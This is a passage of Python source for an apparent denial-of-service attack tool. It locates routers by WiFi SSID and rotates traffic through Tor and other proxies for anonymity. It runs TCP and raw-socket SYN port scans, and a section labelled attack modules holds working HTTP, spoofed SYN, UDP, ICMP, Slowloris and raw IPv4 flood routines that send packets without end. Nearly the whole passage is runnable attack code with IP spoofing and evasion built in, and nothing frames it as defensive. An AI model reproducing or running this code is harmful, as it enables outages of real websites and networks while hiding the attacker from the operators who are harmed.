                                    "ssid": current_ssid,
                                    "bssid": current_bssid,
                                    "channel": current_channel,
                                    "signal": current_signal,
                                    "auth": "",
                                    "radio": "",
                                })
            except Exception:
                pass

    return networks


def get_current_wifi_info():
    """
    Get info about the currently connected WiFi network.
    Returns dict with SSID, BSSID, Channel, etc. or None.
    Works on both Windows and Linux.
    """
    if IS_WINDOWS:
        try:
            result = subprocess.run(
                ["netsh", "wlan", "show", "interfaces"],
                capture_output=True, text=True
            )
            info = {}
            for line in result.stdout.split("\n"):
                line = line.strip()
                if "SSID" in line and "BSSID" not in line and ":" in line:
                    parts = line.split(":", 1)
                    info["ssid"] = parts[1].strip() if len(parts) > 1 else ""
                elif "BSSID" in line and ":" in line:
                    parts = line.split(":", 1)
                    info["bssid"] = parts[1].strip() if len(parts) > 1 else ""
                elif "Channel" in line and ":" in line:
                    parts = line.split(":", 1)
                    info["channel"] = parts[1].strip() if len(parts) > 1 else ""
                elif "Signal" in line and ":" in line:
                    parts = line.split(":", 1)
                    info["signal"] = parts[1].strip() if len(parts) > 1 else ""
                elif "Radio type" in line and ":" in line:
                    parts = line.split(":", 1)
                    info["radio"] = parts[1].strip() if len(parts) > 1 else ""
                elif "Authentication" in line and ":" in line:
                    parts = line.split(":", 1)
                    info["auth"] = parts[1].strip() if len(parts) > 1 else ""
            return info if info else None
        except Exception:
            return None
    else:
        try:
            result = subprocess.run(
                ["nmcli", "-t", "-f", "GENERAL.CONNECTION", "device", "show"],
                capture_output=True, text=True
            )
            info = {}
            for line in result.stdout.split("\n"):
                if "GENERAL.CONNECTION:" in line:
                    info["ssid"] = line.split(":", 1)[1].strip()
            if info.get("ssid"):
                result2 = subprocess.run(
                    ["iwconfig"], capture_output=True, text=True
                )
                for line in result2.stdout.split("\n"):
                    if "Access Point:" in line:
                        info["bssid"] = line.split("Access Point:")[1].strip()
                    elif "Frequency:" in line:
                        info["channel"] = line.split("Frequency:")[1].strip()
                    elif "Signal level:" in line:
                        info["signal"] = line.split("Signal level:")[1].strip()
                return info if info else None
        except Exception:
            return None
    return None


def find_router_by_ssid(target_ssid: str):
    """
    Given an SSID, find the router's IP address.
    Uses multiple techniques:
    1. Check if connected to that SSID → get gateway
    2. Scan subnet for router by checking open ports
    3. ARP table lookup
    4. Network scan

    Returns (router_ip, vendor, bssid) or (None, None, None).
    """
    print(f"\n[*] Searching for router with SSID: '{target_ssid}'...")

    # Method 1: Check current WiFi connection
    current = get_current_wifi_info()
    if current and current.get("ssid", "").lower() == target_ssid.lower():
        print(f"[OK] Currently connected to '{target_ssid}'!")
        router_ip = get_default_gateway()
        if router_ip:
            bssid = current.get("bssid", "")
            vendor = get_oui_lookup(bssid) if bssid else "Unknown"
            print(f"[OK] Router IP: {router_ip} | BSSID: {bssid} | Vendor: {vendor}")
            return router_ip, vendor, bssid

    # Method 2: Scan all WiFi networks to find matching SSID
    networks = scan_wifi_networks()
    matching = [n for n in networks if n.get("ssid", "").lower() == target_ssid.lower()]

    if matching:
        net = matching[0]
        bssid = net.get("bssid", "")
        vendor = get_oui_lookup(bssid) if bssid else "Unknown"
        print(f"[OK] Found SSID '{target_ssid}'")
        print(f"    BSSID: {bssid} | Channel: {net.get('channel', '?')} | "
              f"Signal: {net.get('signal', '?')} | Vendor: {vendor}")

        # Try to find the router IP
        router_ip = get_default_gateway()
        if router_ip:
            print(f"[OK] Router IP (gateway): {router_ip}")
            return router_ip, vendor, bssid

        # Fallback: scan common router IPs
        print("[*] Scanning for router IP on common addresses...")
        for ip in ["192.168.1.1", "192.168.0.1", "10.0.0.1",
                    "192.168.1.254", "192.168.0.254", "192.168.2.1",
                    "192.168.10.1", "192.168.100.1", "10.0.0.138"]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.3)
                if s.connect_ex((ip, 80)) == 0:
                    s.close()
                    print(f"[OK] Router found at: {ip} (port 80 open)")
                    return ip, vendor, bssid
                s.close()
            except Exception:
                pass

    # Method 3: Network-wide scan
    print("[*] Full network scan for router...")
    local_ip = get_local_ip()
    if local_ip != "127.0.0.1":
        parts = local_ip.split(".")
        subnet_base = f"{parts[0]}.{parts[1]}.{parts[2]}"

        for i in [1, 254] + list(range(2, 10)) + list(range(245, 254)):
            ip = f"{subnet_base}.{i}"
            if ip == local_ip:
                continue
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.2)
                # Check HTTP port
                if s.connect_ex((ip, 80)) == 0:
                    s.close()
                    # Try to fetch title to verify it's a router
                    try:
                        import urllib.request
                        req = urllib.request.Request(
                            f"http://{ip}/", headers={"User-Agent": USER_AGENTS[0]}
                        )
                        resp = urllib.request.urlopen(req, timeout=2)
                        html = resp.read(4096).decode(errors='ignore')
                        title = ""
                        if "<title>" in html.lower():
                            title = html.lower().split("<title>")[1].split("</title>")[0]
                        # Common router title keywords
                        router_keywords = ["router", "login", "admin", "tp-link",
                                           "netgear", "d-link", "linksys", "asus",
                                           "gateway", "modem", "setup", "wizard",
                                           "management", "dd-wrt", "openwrt"]
                        if any(kw in title.lower() for kw in router_keywords):
                            print(f"[OK] Router found at: {ip} (title: {title})")
                            return ip, "Unknown (detected by scan)", ""
                    except Exception:
                        pass
                    print(f"[OK] Potential router at: {ip} (port 80 open)")
                    return ip, "Unknown", ""
                s.close()
            except Exception:
                pass

    print("[X] Could not find router for SSID: " + target_ssid)
    return None, None, None


# ──────────────────────────────────────────────────────────────────────
#  PROXY / VPN BOT MANAGER
# ──────────────────────────────────────────────────────────────────────

class ProxyManager:
    """
    Manages multiple proxy backends for traffic anonymization.
    Supports: Tor (SOCKS5), custom SOCKS5, HTTP proxies, and rotation.
    Works on all platforms.
    """

    def __init__(self):
        self.proxies: list = []
        self.current_index = 0
        self.lock = threading.Lock()

    def add_proxy(self, proxy_type: str, host: str, port: int,
                  description: str = ""):
        """Add a proxy to the rotation pool."""
        self.proxies.append({
            "type": proxy_type,
            "host": host,
            "port": port,
            "desc": description,
            "failures": 0,
            "enabled": True,
        })

    def add_tor(self):
        """Add default Tor proxy."""
        self.add_proxy("socks5", "127.0.0.1", 9050, "Tor (port 9050)")
        self.add_proxy("socks5", "127.0.0.1", 9150, "Tor Browser (port 9150)")

    def add_common_vpn_proxies(self):
        """Add common local VPN/proxy ports."""
        common = [
            ("socks5", "127.0.0.1", 1080, "SOCKS5 Local"),
            ("http",   "127.0.0.1", 8080, "HTTP Proxy Local"),
            ("http",   "127.0.0.1", 3128, "Squid Proxy"),
            ("socks5", "127.0.0.1", 10808, "SOCKS5 Alt"),
        ]
        for ptype, host, port, desc in common:
            self.add_proxy(ptype, host, port, desc)

    def add_custom_proxy(self, address: str):
        """Parse and add a custom proxy."""
        addr = address.strip()
        ptype = "socks5"
        if "://" in addr:
            ptype, addr = addr.split("://", 1)
            ptype = ptype.lower().strip()
        if ":" in addr:
            host, port_str = addr.rsplit(":", 1)
            try:
                port = int(port_str)
            except ValueError:
                port = 9050
        else:
            host = addr
            port = 9050
        self.add_proxy(ptype, host, port, f"Custom: {address}")

    def get_next_proxy(self):
        """Round‑robin through enabled proxies."""
        with self.lock:
            if not self.proxies:
                return None
            total = len(self.proxies)
            for _ in range(total):
                proxy = self.proxies[self.current_index]
                self.current_index = (self.current_index + 1) % total
                if proxy["enabled"] and proxy["failures"] < 3:
                    return proxy
            for p in self.proxies:
                p["failures"] = 0
                p["enabled"] = True
            return self.proxies[0] if self.proxies else None

    def mark_failure(self, proxy: dict):
        """Mark a proxy as having failed."""
        with self.lock:
            proxy["failures"] += 1
            if proxy["failures"] >= 5:
                proxy["enabled"] = False

    def list_proxies(self):
        """Print current proxy pool."""
        if not self.proxies:
            print("    (no proxies configured)")
            return
        print("\n    ┌─ Active Proxy Pool ─────────────────────────────┐")
        for i, p in enumerate(self.proxies):
            status = "✓" if p["enabled"] else "✗"
            print(f"    │ {status} [{p['type']:>6}] {p['host']}:{p['port']:<6} "
                  f"failures={p['failures']}  {p['desc']}")
        print("    └──────────────────────────────────────────────────┘")

    def create_socket(self, target_type: str = "tcp"):
        """Create a socket routed through the next available proxy."""
        proxy = self.get_next_proxy()
        if proxy is None or not SOCKS_AVAILABLE:
            if target_type == "tcp":
                return socket.socket(socket.AF_INET, socket.SOCK_STREAM), None
            else:
                return socket.socket(socket.AF_INET, socket.SOCK_DGRAM), None
        try:
            ptype = proxy["type"]
            if ptype in ("socks5", "socks4", "socks"):
                socks_ver = socks_module.SOCKS5 if ptype == "socks5" else socks_module.SOCKS4
                sock = socks_module.socksocket()
                sock.set_proxy(socks_ver, proxy["host"], proxy["port"])
                return sock, proxy
            elif ptype == "http":
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                return sock, proxy
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                return sock, proxy
        except Exception:
            self.mark_failure(proxy)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            return sock, None


# ──────────────────────────────────────────────────────────────────────
#  TARGET RESOLUTION
# ──────────────────────────────────────────────────────────────────────

def resolve_target(host: str, target_type: str) -> tuple:
    """Resolve a hostname or validate an IP address."""
    host = host.replace("https://", "").replace("http://", "")
    host = host.replace("www.", "").rstrip("/").strip()
    if target_type == "ip":
        try:
            socket.inet_aton(host)
            return host, host
        except OSError:
            if host.lower() == "localhost":
                return "127.0.0.1", "localhost"
            print(f"[!] '{host}' is not a valid IPv4 address.")
            raise SystemExit(1)
    try:
        ip = socket.gethostbyname(host)
        print(f"[OK] Resolved → {host} → {ip}")
        return ip, host
    except socket.gaierror:
        print(f"[X] Cannot resolve '{host}'")
        raise SystemExit(2)


# ──────────────────────────────────────────────────────────────────────
#  ENHANCED PORT SCANNER
# ──────────────────────────────────────────────────────────────────────

def tcp_connect_scan(ip: str, port: int, timeout: float = SOCKET_TIMEOUT):
    """TCP connect() scan – returns port if open, else None."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, port))
        sock.close()
        return port if result == 0 else None
    except Exception:
        return None


def syn_stealth_scan(ip: str, port: int, timeout: float = 2.0):
    """SYN stealth scan using raw sockets. Requires root + Linux."""
    if IS_WINDOWS:
        return None
    try:
        send_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        send_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        recv_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        recv_sock.settimeout(timeout)
        source_port = random.randint(1024, 65535)
        seq_num = random.randint(0, 0xFFFFFFFF)
        ip_ver, ip_ihl = 4, 5
        ip_tot_len = 40
        ip_id = random.randint(0, 65535)
        ip_ttl = 64
        ip_src = socket.inet_aton(random_ipv4())
        ip_dst = socket.inet_aton(ip)
        ip_header = struct.pack(
            '!BBHHHBBH4s4s',
            (ip_ver << 4) + ip_ihl, 0, ip_tot_len, ip_id,
            0, ip_ttl, socket.IPPROTO_TCP, 0,
            ip_src, ip_dst
        )
        ip_header = struct.pack(
            '!BBHHHBBH4s4s',
            (ip_ver << 4) + ip_ihl, 0, ip_tot_len, ip_id,
            0, ip_ttl, socket.IPPROTO_TCP, checksum(ip_header),
            ip_src, ip_dst
        )
        tcp_offset = 5
        tcp_flags = 0x02
        tcp_win = 5840
        tcp_header = struct.pack(
            '!HHLLBBHHH',
            source_port, port, seq_num, 0,
            (tcp_offset << 4), tcp_flags, tcp_win, 0, 0
        )
        pseudo = struct.pack(
            '!4s4sBBH',
            ip_src, ip_dst, 0, socket.IPPROTO_TCP, len(tcp_header)
        )
        tcp_checksum_val = checksum(pseudo + tcp_header)
        tcp_header = struct.pack(
            '!HHLLBBHHH',
            source_port, port, seq_num, 0,
            (tcp_offset << 4), tcp_flags, tcp_win, tcp_checksum_val, 0
        )
        packet = ip_header + tcp_header
        send_sock.sendto(packet, (ip, 0))
        while True:
            try:
                data, addr = recv_sock.recvfrom(1024)
                if addr[0] == ip:
                    tcp_flags_byte = data[33]
                    if tcp_flags_byte & 0x12 == 0x12:
                        send_sock.close()
                        recv_sock.close()
                        return port
            except socket.timeout:
                break
        send_sock.close()
        recv_sock.close()
        return None
    except PermissionError:
        return None
    except Exception:
        return None


def scan_ports(ip: str, ports: list = None, stealth: bool = False,
               workers: int = 100) -> list:
    """Multi‑threaded port scanner — works on all platforms."""
    ports = ports or DEFAULT_PORTS
    if IS_WINDOWS and stealth:
        print("[!] Windows restricts raw sockets — using TCP connect scan.")
        stealth = False
    if stealth and not check_root():
        print("[!] Root required for SYN scan — falling back to TCP connect.")
        stealth = False
    scan_func = syn_stealth_scan if stealth else tcp_connect_scan
    scan_mode = "SYN stealth" if stealth else "TCP connect"
    print(f"\n[*] Scanning {len(ports)} ports on {ip} ({scan_mode} mode)...")
    open_ports = []
    with ThreadPoolExecutor(max_workers=min(workers, 200)) as executor:
        futures = {executor.submit(scan_func, ip, port): port for port in ports}
        for future in as_completed(futures):
            result = future.result()
            if result:
                open_ports.append(result)
                print(f"    [OPEN] Port {result}")
    if not open_ports:
        print("    [!] No open ports found.")
    else:
        print(f"\n[OK] {len(open_ports)} open ports: {sorted(open_ports)}")
    return sorted(open_ports)


def pick_port(open_ports: list) -> int:
    """Let user pick a port from the list or enter one manually."""
    if not open_ports:
        return ask_port_manual()
    if len(open_ports) == 1:
        print(f"[*] Auto‑selected Port {open_ports[0]}")
        return open_ports[0]
    for i, p in enumerate(open_ports, 1):
        print(f"    {i}. Port {p}")
    while True:
        choice = input("    Pick number (Enter = first): ").strip()
        if not choice:
            return open_ports[0]
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(open_ports):
                return open_ports[idx]
        except ValueError:
            pass
        print("    [!] Invalid choice.")


def ask_port_manual() -> int:
    """Prompt user for a port number."""
    while True:
        p = input("\n[+] Target port [80]: ").strip()
        if not p:
            return 80
        try:
            port = int(p)
            if 1 <= port <= 65535:
                return port
        except ValueError:
            pass
        print("[!] Enter a valid port (1‑65535).")


# ──────────────────────────────────────────────────────────────────────
#  ATTACK MODULES — STANDARD FLOODS
# ──────────────────────────────────────────────────────────────────────

def http_flood_worker(ip: str, port: int, host: str, use_ssl: bool = False,
                      proxy_mgr: ProxyManager = None):
    """Single HTTP flood worker."""
    if stop_event.is_set():
        return
    sock = None
    try:
        if proxy_mgr and proxy_mgr.proxies:
            sock, proxy_info = proxy_mgr.create_socket("tcp")
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            proxy_info = None
        sock.settimeout(3)
        sock.connect((ip, port))
        if use_ssl:
            import ssl
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            sock = context.wrap_socket(sock, server_hostname=host)
        path = random_path()
        ua = random.choice(USER_AGENTS)
        referer = random_referer(host)
        method = random.choice(["GET", "HEAD", "POST", "PUT", "DELETE", "OPTIONS"])
        payload = (
            f"{method} {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: {ua}\r\n"
            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
            f"Accept-Language: en-US,en;q=0.9\r\n"
            f"Accept-Encoding: gzip, deflate, br\r\n"
            f"Referer: {referer}\r\n"
            f"Cache-Control: no-cache\r\n"
            f"Pragma: no-cache\r\n"
            f"Connection: close\r\n"
            f"X-Forwarded-For: {random_ipv4()}\r\n\r\n"
        )
        sock.send(payload.encode())
        sock.recv(4096)
        increment_packets(1, len(payload))
    except Exception:
        if proxy_mgr and 'proxy_info' in locals() and proxy_info:
            proxy_mgr.mark_failure(proxy_info)
    finally:
        try:
            sock.close()
        except Exception:
            pass


def http_flood(ip: str, port: int, host: str, threads: int,
               use_ssl: bool = False, proxy_mgr: ProxyManager = None):
    """Launch HTTP flood attack."""
    print(f"\n[*] HTTP Flood → {host}:{port} | Workers: {threads} | "
          f"SSL: {use_ssl} | Proxies: {len(proxy_mgr.proxies) if proxy_mgr else 0}")
    print("[*] Running INFINITE packets — press Ctrl+C to stop\n")
    threading.Thread(target=stats_reporter, args=(2.0,), daemon=True).start()
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [
            executor.submit(_http_flood_loop, ip, port, host, use_ssl, proxy_mgr)
            for _ in range(threads)
        ]
        try:
            for f in as_completed(futures):
                f.result()
        except KeyboardInterrupt:
            stop_event.set()
            print(f"\n[!] Interrupted. {format_rate()}")


def _http_flood_loop(ip: str, port: int, host: str, use_ssl: bool,
                     proxy_mgr: ProxyManager = None):
    while not stop_event.is_set():
        http_flood_worker(ip, port, host, use_ssl, proxy_mgr)


def syn_flood_worker(ip: str, port: int):
    """Send a single spoofed TCP SYN packet."""
    if stop_event.is_set() or IS_WINDOWS:
        return
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        src_ip = random_ipv4()
        src_port = random.randint(1024, 65535)
        seq_num = random.randint(0, 0xFFFFFFFF)
        ip_ver, ip_ihl = 4, 5
        ip_tot_len = 40
        ip_id = random.randint(0, 65535)
        ip_ttl = random.randint(32, 255)
        ip_src_bytes = socket.inet_aton(src_ip)
        ip_dst_bytes = socket.inet_aton(ip)
        ip_header = struct.pack('!BBHHHBBH4s4s',
                                (ip_ver << 4) + ip_ihl, 0, ip_tot_len, ip_id,
                                0, ip_ttl, socket.IPPROTO_TCP, 0,
                                ip_src_bytes, ip_dst_bytes)
        ip_header = struct.pack('!BBHHHBBH4s4s',
                                (ip_ver << 4) + ip_ihl, 0, ip_tot_len, ip_id,
                                0, ip_ttl, socket.IPPROTO_TCP, checksum(ip_header),
                                ip_src_bytes, ip_dst_bytes)
        tcp_offset = 5
        tcp_flags = 0x02
        tcp_win = random.randint(1024, 65535)
        tcp_header = struct.pack('!HHLLBBHHH', src_port, port, seq_num, 0,
                                 (tcp_offset << 4), tcp_flags, tcp_win, 0, 0)
        pseudo = struct.pack('!4s4sBBH', ip_src_bytes, ip_dst_bytes, 0,
                             socket.IPPROTO_TCP, len(tcp_header))
        tcp_checksum_val = checksum(pseudo + tcp_header)
        tcp_header = struct.pack('!HHLLBBHHH', src_port, port, seq_num, 0,
                                 (tcp_offset << 4), tcp_flags, tcp_win,
                                 tcp_checksum_val, 0)
        packet = ip_header + tcp_header
        sock.sendto(packet, (ip, 0))
        increment_packets(1, len(packet))
    except PermissionError:
        print("[X] SYN Flood requires ROOT privileges!")
        stop_event.set()
    except Exception:
        pass
    finally:
        try:
            sock.close()
        except Exception:
            pass


def syn_flood(ip: str, port: int, threads: int):
    """Launch SYN flood attack."""
    if IS_WINDOWS:
        print("[X] SYN Flood (raw sockets) is NOT available on Windows.")
        print("[*] Windows restricts raw socket creation since XP SP2.")
        print("[*] Use HTTP Flood or UDP Flood instead.")
        return
    if not check_root():
        print("[X] SYN Flood requires ROOT privileges. Aborting.")
        return
    print(f"\n[*] SYN Flood → {ip}:{port} | Workers: {threads} | Spoofed IPs: ON")
    print("[*] Running INFINITE packets — press Ctrl+C to stop\n")
    threading.Thread(target=stats_reporter, args=(2.0,), daemon=True).start()
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(_syn_flood_loop, ip, port) for _ in range(threads)]
        try:
            for f in as_completed(futures):
                f.result()
        except KeyboardInterrupt:
            stop_event.set()
            print(f"\n[!] Interrupted. {format_rate()}")


def _syn_flood_loop(ip: str, port: int):
    while not stop_event.is_set():
        syn_flood_worker(ip, port)


def udp_flood_worker(ip: str, port: int, payload_size: int = 1024):
    """Send a single UDP datagram to the target."""
    if stop_event.is_set():
        return
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        actual_size = random.randint(max(1, payload_size // 2), payload_size)
        data = random.randbytes(actual_size)
        sock.sendto(data, (ip, port))
        increment_packets(1, len(data))
    except Exception:
        pass
    finally:
        try:
            sock.close()
        except Exception:
            pass


def udp_flood(ip: str, port: int, threads: int, payload_size: int = 1024):
    """Launch UDP flood attack."""
    print(f"\n[*] UDP Flood → {ip}:{port} | Workers: {threads} | "
          f"Payload: ~{payload_size}B")
    print("[*] Running INFINITE packets — press Ctrl+C to stop\n")
    threading.Thread(target=stats_reporter, args=(2.0,), daemon=True).start()
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [
            executor.submit(_udp_flood_loop, ip, port, payload_size)
            for _ in range(threads)
        ]
        try:
            for f in as_completed(futures):
                f.result()
        except KeyboardInterrupt:
            stop_event.set()
            print(f"\n[!] Interrupted. {format_rate()}")


def _udp_flood_loop(ip: str, port: int, payload_size: int):
    while not stop_event.is_set():
        udp_flood_worker(ip, port, payload_size)


def icmp_flood_worker(ip: str, payload_size: int = 64):
    """Send a single ICMP Echo Request (ping)."""
    if stop_event.is_set() or IS_WINDOWS:
        return
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        icmp_type, icmp_code = 8, 0
        icmp_id = random.randint(0, 65535)
        icmp_seq = random.randint(0, 65535)
        actual_size = random.randint(max(8, payload_size // 2), payload_size)
        payload = random.randbytes(actual_size)
        icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, 0, icmp_id, icmp_seq)
        icmp_checksum_val = checksum(icmp_header + payload)
        icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code,
                                  icmp_checksum_val, icmp_id, icmp_seq)
        sock.sendto(icmp_header + payload, (ip, 0))
        increment_packets(1, len(icmp_header) + len(payload))
    except PermissionError:
        print("[X] ICMP Flood requires ROOT privileges!")
        stop_event.set()
    except Exception:
        pass
    finally:
        try:
            sock.close()
        except Exception:
            pass


def icmp_flood(ip: str, threads: int, payload_size: int = 64):
    """Launch ICMP flood."""
    if IS_WINDOWS:
        print("[X] ICMP Flood (raw ICMP sockets) is NOT available on Windows.")
        print("[*] Use UDP Flood instead — it works on all platforms.")
        return
    if not check_root():
        print("[X] ICMP Flood requires ROOT privileges. Aborting.")
        return
    print(f"\n[*] ICMP Flood → {ip} | Workers: {threads} | Payload: ~{payload_size}B")
    print("[*] Running INFINITE packets — press Ctrl+C to stop\n")
    threading.Thread(target=stats_reporter, args=(2.0,), daemon=True).start()
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [
            executor.submit(_icmp_flood_loop, ip, payload_size)
            for _ in range(threads)
        ]
        try:
            for f in as_completed(futures):
                f.result()
        except KeyboardInterrupt:
            stop_event.set()
            print(f"\n[!] Interrupted. {format_rate()}")


def _icmp_flood_loop(ip: str, payload_size: int):
    while not stop_event.is_set():
        icmp_flood_worker(ip, payload_size)


def tors_hammer_worker(ip: str, port: int, host: str, use_ssl: bool = False,
                       use_tor: bool = False, delay_ms: int = 500,
                       proxy_mgr: ProxyManager = None, keepalive: bool = True):
    """Tor's Hammer / Slowloris worker — ADDITIVE mode."""
    if stop_event.is_set():
        return
    sock = None
    try:
        if use_tor or (proxy_mgr and proxy_mgr.proxies):
            if proxy_mgr and proxy_mgr.proxies and not use_tor:
                sock, proxy_info = proxy_mgr.create_socket("tcp")
            elif SOCKS_AVAILABLE:
                sock = socks_module.socksocket()
                if use_tor:
                    sock.set_proxy(socks_module.SOCKS5, "127.0.0.1", 9050)
                proxy_info = {"type": "socks5", "host": "127.0.0.1", "port": 9050}
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                proxy_info = None
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            proxy_info = None
        sock.settimeout(SLOWLORIS_SOCKET_TIMEOUT)
        sock.connect((ip, port))
        if use_ssl:
            import ssl
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            sock = context.wrap_socket(sock, server_hostname=host)
        path = random_path()
        ua = random.choice(USER_AGENTS)
        content_length = random.randint(5000, 50000)
        initial = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: {ua}\r\n"
            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            f"Accept-Language: en-US,en;q=0.5\r\n"
            f"Accept-Encoding: gzip, deflate, br\r\n"
            f"Connection: keep-alive\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {content_length}\r\n"
            f"X-Forwarded-For: {random_ipv4()}\r\n"
        )
        sock.send(initial.encode())
        increment_packets(1, len(initial))
        for _ in range(random.randint(3, 8)):
            if stop_event.is_set():
                break
            header = (
                f"X-Additive-{random.randint(0, 99999)}: "
                f"{random.randbytes(random.randint(16, 64)).hex()}\r\n"
            )
            sock.send(header.encode())
            increment_packets(1, len(header))
            time.sleep(random.uniform(delay_ms / 1000, (delay_ms * 2.5) / 1000))
        while not stop_event.is_set() and keepalive:
            chunk_size = random.randint(8, 64)
            body_chunk = random.randbytes(chunk_size)
            sock.send(body_chunk)
            increment_packets(1, chunk_size)
            time.sleep(random.uniform(delay_ms / 1000, (delay_ms * 3) / 1000))
    except (socket.timeout, ConnectionRefusedError, ConnectionResetError,
            BrokenPipeError, OSError):
        pass
    except Exception:
        pass
    finally:
        try:
            sock.close()
        except Exception:
            pass


def tors_hammer(ip: str, port: int, host: str, threads: int,
                use_ssl: bool = False, use_tor: bool = False,
                delay_ms: int = 500, proxy_mgr: ProxyManager = None,
                ramp_up: bool = True):
    """Launch Tor's Hammer / Slowloris attack — ADDITIVE."""
    mode = "Tor's Hammer (via Tor)" if use_tor else "Slowloris (direct)"
    if proxy_mgr and proxy_mgr.proxies and not use_tor:
        mode = f"Slowloris ({len(proxy_mgr.proxies)} proxies)"
    print(f"\n[*] {mode} → {host}:{port} | Workers: {threads} | "
          f"Delay: {delay_ms}ms | SSL: {use_ssl}")
    print("[*] ADDITIVE mode: connections accumulate over time")
    print("[*] Running INFINITE — press Ctrl+C to stop\n")
    threading.Thread(target=stats_reporter, args=(3.0,), daemon=True).start()
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        launched = 0
        if ramp_up:
            ramp_steps = min(threads, 50)
            step_size = max(1, threads // ramp_steps)
            for batch in range(ramp_steps):
                if stop_event.is_set():
                    break
                batch_count = min(step_size, threads - launched)
                for _ in range(batch_count):
                    if stop_event.is_set():
                        break
                    f = executor.submit(
                        _tors_hammer_loop, ip, port, host, use_ssl, use_tor,
                        delay_ms, proxy_mgr
                    )
                    futures.append(f)
                    launched += 1
                print(f"    [+] Active connections: {launched}/{threads}")
                time.sleep(0.4)
        else:
            for _ in range(threads):
                f = executor.submit(
                    _tors_hammer_loop, ip, port, host, use_ssl, use_tor,
                    delay_ms, proxy_mgr
                )
                futures.append(f)
                launched += 1
        print(f"    [+] All {launched} connections launched. Accumulating...")
        try:
            for f in as_completed(futures):
                f.result()
        except KeyboardInterrupt:
            stop_event.set()
            print(f"\n[!] Interrupted. {format_rate()}")


def _tors_hammer_loop(ip: str, port: int, host: str, use_ssl: bool,
                      use_tor: bool, delay_ms: int, proxy_mgr: ProxyManager = None):
    while not stop_event.is_set():
        tors_hammer_worker(ip, port, host, use_ssl, use_tor, delay_ms, proxy_mgr)
        time.sleep(random.uniform(0.05, 0.3))


def ipv4_raw_worker(target_ip: str, target_ports: list):
    """Send raw IPv4 packets at maximum rate."""
    if stop_event.is_set() or IS_WINDOWS:
        return
    sock = None
    try:
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                                 socket.ntohs(0x0003))
        except (AttributeError, OSError):
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                                 socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        port = random.choice(target_ports)
        src_ip = random_ipv4()
        ip_src_bytes = socket.inet_aton(src_ip)
        ip_dst_bytes = socket.inet_aton(target_ip)
        attack_type = random.choice(["syn", "udp", "raw"])
        if attack_type == "syn":
            ip_ver, ip_ihl = 4, 5
            ip_tot_len = 40
            ip_id = random.randint(0, 65535)
            ip_ttl = random.randint(48, 255)
            ip_header = struct.pack('!BBHHHBBH4s4s',
                                    (ip_ver << 4) + ip_ihl, 0, ip_tot_len, ip_id,
                                    0, ip_ttl, socket.IPPROTO_TCP, 0,
                                    ip_src_bytes, ip_dst_bytes)
            ip_header = struct.pack('!BBHHHBBH4s4s',
                                    (ip_ver << 4) + ip_ihl, 0, ip_tot_len, ip_id,
                                    0, ip_ttl, socket.IPPROTO_TCP, checksum(ip_header),
                                    ip_src_bytes, ip_dst_bytes)
            src_port = random.randint(1, 65535)
            seq = random.randint(0, 0xFFFFFFFF)
            tcp_hdr = struct.pack('!HHLLBBHHH', src_port, port, seq, 0,
                                  0x50, 0x02, 0xFFFF, 0, 0)
            pseudo = struct.pack('!4s4sBBH', ip_src_bytes, ip_dst_bytes, 0,
                                 socket.IPPROTO_TCP, len(tcp_hdr))
            tcp_hdr = struct.pack('!HHLLBBHHH', src_port, port, seq, 0,
                                  0x50, checksum(pseudo + tcp_hdr), 0xFFFF, 0, 0)
            packet = ip_header + tcp_hdr
        elif attack_type == "udp":
            udp_payload_len = random.randint(0, 1024)
            ip_tot_len = 28 + udp_payload_len
            ip_id = random.randint(0, 65535)
            ip_ttl = random.randint(48, 255)
            ip_header = struct.pack('!BBHHHBBH4s4s',
                                    (4 << 4) + 5, 0, ip_tot_len, ip_id,
                                    0, ip_ttl, socket.IPPROTO_UDP, 0,
                                    ip_src_bytes, ip_dst_bytes)
            ip_header = struct.pack('!BBHHHBBH4s4s',
                                    (4 << 4) + 5, 0, ip_tot_len, ip_id,
                                    0, ip_ttl, socket.IPPROTO_UDP, checksum(ip_header),
